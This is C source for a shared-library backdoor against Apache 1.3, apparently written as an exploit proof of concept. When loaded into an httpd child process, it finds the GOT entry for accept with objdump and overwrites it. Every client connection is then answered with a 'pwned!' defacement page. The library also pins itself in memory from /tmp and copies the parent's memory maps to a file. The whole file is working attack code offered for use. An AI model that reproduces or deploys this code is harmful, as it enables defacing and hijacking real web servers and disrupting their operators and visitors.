/*
 * http://felinemenace.org - local PHP fun stuff ;) by Andrew Griffiths.
 * This causes "infected" apache child processes to return a "defaced" page upon
 * connection. This won't work on apache 2.x due to how it handles return codes
 * from accept. oh well ;)
 */

#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <errno.h>

int bd_fd = 0;
int (*real_accept)(int fd, struct sockaddr *sin, socklen_t *addrlen);
int bd_init=0;
int *f;

extern int errno;

char content[] = 
"HTTP/1.1 200 OK\n"
"Date: Mon, 26 May 2003 03:29:44 GMT\n"
"Server: Apache/1.3.27 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.12 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26\n"
"Connection: close\n"
"Content-Type: text/html; charset=iso-8859-1\n\n\n"

"<HTML><HEAD><TITLE>pwned!</TITLE></HEAD><BODY>woo</BODY></HTML>";

void trace(char *string)
{
	char buf[32];
	
	if(bd_fd == 0) {
		sprintf(buf, "/tmp/tracez.%d", getpid());
		bd_fd = open(buf, O_WRONLY|O_CREAT|O_TRUNC|O_SYNC, 0777);
		if(bd_fd == -1) {
			system("echo fscking damnit. unable to open file > /tmp/trace");
			exit(EXIT_FAILURE);
		}
	}
	write(bd_fd, string, strlen(string));
}

int fake_accept(int fd, struct sockaddr *addr, socklen_t *addrlen)
{
	int client_fd;

	trace("fake_accept()ing it up\n");
	
	client_fd = real_accept(fd, addr, addrlen);
	if(client_fd <= 0) return client_fd;

	write(client_fd, content, strlen(content));

	close(client_fd);

	errno = EINTR;
	return -1;
}

#ifndef RTLD_NODELETE
#define RTLD_NODELETE   0x01000 /* bits/dlfcn.h */
#endif

void load_self()
{
	trace("Locking ourselves into the process ...");
	setenv("pwned", "true", 1);
	dlopen("/tmp/libby.so", 0);
	dlopen("/tmp/libby.so", RTLD_NODELETE); /* pwned indeed :) */
	unsetenv("pwned");
	trace("done\n");
}

void _init()
{
	char cmd[1024], cmd2[1024];
	FILE *p;
	

	if(getenv("pwned")) return;
	
	sprintf(cmd, "Starting up: pid %d\n", getpid());
	system("cat /proc/$PPID/maps > /tmp/t");
	trace(cmd);
	
	if(bd_init == 0) {

		load_self();
		
		sprintf(cmd2, "objdump -R /usr/sbin/httpd | grep accept | grep JUMP\n", cmd);
		trace(cmd2);	
		p = popen(cmd2, "r");
		
		fscanf(p, "%08x ", &f);
		memset(cmd, 0, sizeof(cmd)-1);
		sprintf(cmd, "&GOT[accept]: %p\n", f);
		trace(cmd);	
		pclose(p);
		
		real_accept = *f;
		sprintf(cmd, "GOT[accept]: %p\n", real_accept);	
		trace(cmd);
		*f = fake_accept;
		sprintf(cmd, "now: GOT[accept]: %p\n", *f);
		trace(cmd);

		bd_init++;
	}
	
}

void _fini()
{
	*f = real_accept;
	trace("ack, closing!!\n");
	close(bd_fd);
}

